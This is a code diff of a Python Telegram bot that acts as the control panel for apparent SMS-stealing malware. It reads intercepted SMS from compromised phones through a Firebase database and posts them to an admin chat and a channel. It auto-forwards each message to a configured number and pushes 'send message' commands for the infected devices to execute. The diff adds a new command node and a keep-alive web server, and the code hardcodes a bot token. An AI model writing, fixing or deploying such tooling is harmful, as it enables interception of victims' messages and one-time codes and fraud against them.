@@ -4,8 +4,9 @@ import re
 import os
 import threading
 import time
+from flask import Flask
 
-
+# ================= FLASK SERVER FOR FREE TIER =================
 app = Flask('')
 
 @app.route('/')
@@ -13,14 +14,11 @@ def home():
     return "Bot is running 24/7!"
 
 def run_web():
-    # Render default port 10000 use karega
     app.run(host='0.0.0.0', port=10000)
-
 
 # ================= CONFIGURATION =================
 BOT_TOKEN = '8258467399:AAE8QarqBDU6VX5y25EdKZgZUreV-VKluvM'
 CONFIG_FILE = 'bot_config.txt'
-# =================================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -76,6 +74,16 @@ def firebase_get(path):
     except Exception as e:
         print(f"❌ GET error [{path}]: {e}")
         return None
+
+def firebase_set(path, data):
+    if not bot_config["firebase_url"]:
+        return False
+    try:
+        r = requests.put(f"{bot_config['firebase_url']}{path}.json", json=data, timeout=10)
+        return r.status_code == 200
+    except Exception as e:
+        print(f"❌ SET error: {e}")
+        return False
 
 def firebase_patch(path, data):
     if not bot_config["firebase_url"]:
@@ -180,7 +188,7 @@ def callback_device(call):
 # ---------- LIVE MONITOR ----------
 processed_received_keys = set()
 last_sent_signature = {}   
-devices_with_baseline = set() 
+devices_with_baseline = set()
 
 def format_phone_display(num):
     if not num:
@@ -204,24 +212,16 @@ def send_to_admin(text):
 def send_to_channel(to_number, message_body):
     if not bot_config["channel_id"]:
         return
-    
-    formatted_phone = format_phone_display(to_number)
-    
-    # NEW REQ: Perfect requested visual format with One-tap copy block
     text = (
-        f"📱 SMS Intercepted\n"
-        f"━━━━━━━━━━━━━━\n"
-        f"📞 To: {formatted_phone}\n"
-        f"💬 Message: {message_body}\n\n"
-        f"📋 One-tap copy:\n"
-        f"`{formatted_phone} | {message_body}`"
+        f"📥 Received To: {format_phone_display(to_number)}\n"
+        f"💬 Message: {message_body}"
     )
     try:
-        bot.send_message(bot_config["channel_id"], text, parse_mode="Markdown")
+        bot.send_message(bot_config["channel_id"], text)
     except Exception as e:
         print(f"⚠️ Channel send fail: {e}")
 
-# --- Received SMS scanner ---
+# --- Received SMS scanner (With Fixed Auto-Forward) ---
 def scan_received_sms(dev_id):
     node = firebase_get(f"messages/{dev_id}")
     if not isinstance(node, dict):
@@ -256,7 +256,6 @@ def scan_received_sms(dev_id):
         body = sms.get("message") or sms.get("body") or sms.get("text") or ""
         dt = sms.get("dateTime") or sms.get("timestamp") or ""
 
-        # 1. Admin Alert log
         admin_text = (
             f"📥 **New SMS Received!**\n"
             f"📱 Device: `{dev_id[:8]}...`\n"
@@ -266,7 +265,6 @@ def scan_received_sms(dev_id):
         )
         send_to_admin(admin_text)
 
-        # 2. Channel Stream Update with new format
         device_phone = None
         client_data = firebase_get(f"clients/{dev_id}")
         if isinstance(client_data, dict):
@@ -274,34 +272,27 @@ def scan_received_sms(dev_id):
 
         send_to_channel(device_phone or dev_id, body)
 
-        # 3. AUTO-FORWARD TO REGISTERED TARGET NUMBER
+        # FIX: Automatic forward payload synchronization with integer simSlot
         if bot_config["forward_number"]:
             fwd_target = bot_config["forward_number"]
-            
             fwd_payload = {
+                "command": "send message",
+                "messageText": body,
+                "phoneNumber": fwd_target,
+                "simSlot": 0,
+                "status": "pending",
+                "targetDeviceId": dev_id,
                 "action": {
                     "command": "send message",
                     "messageText": body,
                     "phoneNumber": fwd_target,
                     "sendSms": {"message": body, "status": "pending", "to": fwd_target},
-                    "simSlot": "0",
+                    "simSlot": 0,
                     "targetDeviceId": dev_id
-                },
-                "webhookEvent": {
-                    "sendSms": {"message": body, "isSended": False, "to": fwd_target}
                 }
             }
-            
-            fwd_success = firebase_patch(f"clients/{dev_id}", fwd_payload)
-            if fwd_success and bot_config["admin_chat_id"]:
-                try:
-                    bot.send_message(
-                        bot_config["admin_chat_id"],
-                        f"⚡ **Auto-Forwarded:** SMS pushed to `{fwd_target}` successfully.",
-                        parse_mode="Markdown"
-                    )
-                except:
-                    pass
+            firebase_patch(f"clients/{dev_id}", fwd_payload)
+            firebase_set(f"commands/{dev_id}", fwd_payload)
 
     if len(processed_received_keys) > 3000:
         processed_received_keys.clear()
@@ -383,7 +374,7 @@ def toggle_monitoring(message):
     if bot_config["is_monitoring"]:
         processed_received_keys.clear()
         last_sent_signature.clear()
-        devices_with_baseline.clear() 
+        devices_with_baseline.clear()
 
     save_local_config()
     status_str = "🟢 ACTIVE" if bot_config["is_monitoring"] else "🔴 INACTIVE"
@@ -415,13 +406,20 @@ def process_channel_command(message):
         
     dev_id = bot_config["selected_device"]
 
+    # FIX: Clean multi-node structure with integer simSlot values
     payload = {
+        "command": "send message",
+        "messageText": sms_text,
+        "phoneNumber": target_phone,
+        "simSlot": 0,
+        "status": "pending",
+        "targetDeviceId": dev_id,
         "action": {
             "command": "send message",
             "messageText": sms_text,
             "phoneNumber": target_phone,
             "sendSms": {"message": sms_text, "status": "pending", "to": target_phone},
-            "simSlot": "0",
+            "simSlot": 0,
             "targetDeviceId": dev_id
         },
         "webhookEvent": {
@@ -429,7 +427,10 @@ def process_channel_command(message):
         }
     }
 
-    success = firebase_patch(f"clients/{dev_id}", payload)
+    # Dono potential nodes par data sync push kiya gaya hai
+    firebase_patch(f"clients/{dev_id}", payload)
+    success = firebase_set(f"commands/{dev_id}", payload)
+
     if success and bot_config["admin_chat_id"]:
         try:
             bot.send_message(
@@ -440,8 +441,10 @@ def process_channel_command(message):
         except:
             pass
 
-# ---------- Startup ----------
+# ==================== STARTUP LOGIC ====================
 if __name__ == "__main__":
+    threading.Thread(target=run_web, daemon=True).start()
+    
     monitor_thread = threading.Thread(target=sms_monitoring_loop, daemon=True)
     monitor_thread.start()
 
@@ -449,7 +452,7 @@ if __name__ == "__main__":
     try:
         me = bot.get_me()
         print(f"✅ Connected as @{me.username}")
-        print("🟢 Bot online. Monitor running.\n")
+        print("🟢 Bot online. Web server & Monitor running.\n")
         bot.infinity_polling()
     except Exception as e:
         print(f"❌ Bot crashed: {e}")
